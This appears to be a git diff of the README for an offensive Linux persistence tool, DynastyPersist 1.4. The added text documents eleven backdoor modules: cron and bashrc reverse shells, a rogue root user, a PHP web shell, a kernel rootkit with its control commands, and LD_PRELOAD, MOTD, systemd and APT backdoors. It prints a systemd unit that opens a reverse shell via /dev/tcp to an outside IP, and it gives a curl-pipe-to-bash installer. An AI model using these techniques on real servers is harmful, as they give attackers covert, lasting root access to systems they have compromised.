@@ -1,5 +1,6 @@
 
 
+
 <h1 align="center">DynastyPersist 1.4</h1>
 
 <div align="center">
@@ -19,8 +20,7 @@
   <p></p>
 </div>
 
-![image](https://github.com/Trevohack/DynastyPersist/assets/136177431/be6f079e-f6a1-4bb6-9b15-510c0cfbcdc3)
-
+![image](https://github.com/Trevohack/DynastyPersist/assets/136177431/0abde422-ce91-4aa5-b0a2-f0ed45a9ca23)
 
 
 
@@ -42,18 +42,152 @@
 | **Modify an Existing Systemd Service** | Manipulates an existing systemd service for persistence. |
 | **Backdoors APT Command** | Backdoors `apt` command to pop up a shell. |
 
+###  [ Modules ]
+
+#### SSH Key Generation
+
+* Gain access to a server using `ssh` key generation. This module creates an `id_rsa` key for every user. Which can be used for reverse access. After, running this module the attacker has the ability to connect to the server via `ssh`.
+
+* This can be manually done using the `ssh-keygen` command. However, the module creates a private key for every user in no time. 
+
+```bash
+root@kali ~ ssh -i id_rsa root@10.10.110.101
+``` 
+
+* Module Number: `1`
+
+#### Cronjob Persistence 
+
+* Cronjobs in Linux are scheduled tasks that run automatically at specified intervals.
+
+* One of the most efficient modules, that involves reverse shells. This module directly writes reverse shell commands to `/etc/crontab`. Which will pop up a shell in the port your listening. 
+
+```bash
+root@kali ~ nc -nvlp 9999
+``` 
+
+* Module Number: `2` 
+
+#### Custom User With Root
+
+* A simple and fast method to gain reverse access. Simply, this module creates another user with root access. Later on, the attacker can login to the user via `ssh`.
+
+```bash
+root@kali ~ ssh newuser@10.10.110.101
+``` 
+
+* Module Number: `3` 
+
+#### RCE Persistence 
+
+* This module, comes with a `php` script that is hosted in the web root directory. The script is located in `/var/www/dynasty_rce/rce.php`. Further, the prefix `dynasty_rce` can be hidden if the `LKM` module is run before. 
+
+* Visiting `victim_ip:port/dynasty_rce/rce.php` will give you the power to run commands within the shell. 
+
+* Module Number: `4`
+
+### LKM Rootkit
+
+* An advance persistence method, that implants a rootkit to the server's kernel. The program focuses on an open source `LKM` rootkit called `Diamorphine`. The module is in `/var/tmp/.memory` as a temporary location. This directory is deleted after the module is set up. 
+
+* The below code block shows the uses of this module. 
+
+```bash
+victim@ubuntu ~ kill -64 0 # Promtes to root user. 
+victim@ubuntu ~ mkdir dynasty_persist # Any directory starting with dynasty will be hidden.
+victim@ubuntu ~ kill -31 <process> # Hides processors
+victim@ubuntu ~ lsmod | grep -i root # Hides itself 
+victim@ubuntu ~ kill -63 0 # Make it appear in lsmod output
+``` 
+
+* Module Number: `5`
+
+#### Bashrc Persistence 
+
+* This module, writes reverse shell commands, aliases, and variables for reverse access. A shell is gifted when a user logins to the server or the person use `find` or `cat`.
+
+```bash
+root@kali ~ nc -nvlp 9999
+``` 
+
+* Module Number: `6`  
+
+#### Systemd Service for Root
+
+* A module that creates a custom service in `systemd` for reverse access. 
+
+* An example: 
+
+```bash
+Description=Dynasty Persist
+
+[Service]
+ExecStart=sudo bash /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/9999 0>&1'
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=default.target"
+``` 
+
+* The above example, will be created as a service. This method is efficient and durable.
+
+* Module Number: `7` 
+
+#### LD_PRELOAD Privilege Escalaion Config
+
+* LD_PRELOAD is an environment variable in Linux that allows users to pre-load a shared library before other libraries. Privilege escalation using LD_PRELOAD involves loading a malicious library to intercept and modify system calls, potentially gaining elevated privileges. The module backdoors commands like `find` and `wget`.
+
+* Module Number: `8` 
+
+#### Backdooring Message of the Day / Header 
+
+* The "Message of the Day" (MOTD) in Linux is a customizable text displayed to users upon login, providing information or updates about the system. It is typically stored in the /etc/motd file and can be modified by system administrators.
+
+* This module, writes a shell to `/etc/update-motd.d/00-header`. This is typically, triggered when a user logs in.
+
+* Module Number: `9` 
+
+#### Modify An Existing Systemd Service 
+
+* Similar to module `7`, this one modifies an existing service for reverse access. 
+
+* Simply, it rewrites the `ExecStartPre` in the service to a reverse shell command. 
+
+* Module Number: `10` 
+
+#### Backdoor APT
+
+* "APT" stands for Advanced Package Tool, and it's commonly used in Debian-based systems such as Ubuntu. The file will be here: `/etc/apt/apt.conf.d/42backdoor` 
+
+* Backdoors the `apt` command, whenever `apt` is run it'll pop up a shell. 
+
+* Module Number: `11` 
+
 
 ### [ MODES ]
 
 * Currently, there are 2 modes available in the latest update (1.4).
 
-* Modes are `normal` and `ctf` which are designed to work in a specific behavior.
+* Modes are `console` and `ctf` which are designed to work in a specific behavior.
 
-* Firstly, `normal` mode enters the tool in the usual setup, with all features. These features will run locally on the local host where the script is being executed. Designed for persistence in real-time operations.
+* In comparison, the `console` mode comes with more features and stability than the `ctf` mode. 
 
-* Secondly, `ctf` (beta) mode is an extra feature to log in to a compromised server via SSH and gain persistence. This addon will help a lot in KoTH or Battlegrounds. Further, this will save a lot of time taken for setting up persistence. 
+#### Console 
 
-* In comparison, the `normal` mode comes with more features and stability than the `ctf` mode. 
+* `console` mode enters the tool in the usual setup, with all features. These features will run locally on the local host where the script is being executed. Designed for persistence in real-time operations.
+
+* The prefix `use` followed by the module number will be used to run any selected module. Like, `use 1`
+
+* Also, the interface is updated the modules/payloads are now visible when you type `show payloads`. 
+
+* Lastly, the help/options menu is also modified enter `show options` to view it.
+
+#### CTF 
+
+* `ctf` mode is an extra feature to log in to a compromised server via SSH and gain persistence. This addon will help a lot in KoTH or Battlegrounds. Further, this will save a lot of time taken for setting up persistence. 
+
+* Runs most of the functions in `console`. 
 
 ### [ USAGE ] 
 
@@ -62,7 +196,7 @@
 ```bash
 $ ./dynasty.sh <lhost> <lport> <mode> 
 $ ./dynasty.sh ctf 
-$ ./dynasty.sh 10.10.14.3 9999 normal
+$ ./dynasty.sh 10.10.14.3 9999 console 
 ``` 
 
 ## Installation
@@ -77,5 +211,3 @@ Via Curl
 ```bash
 $ curl -sSL https://raw.githubusercontent.com/Trevohack/DynastyPersist/main/src/dynasty.sh | bash
 ```
-
-
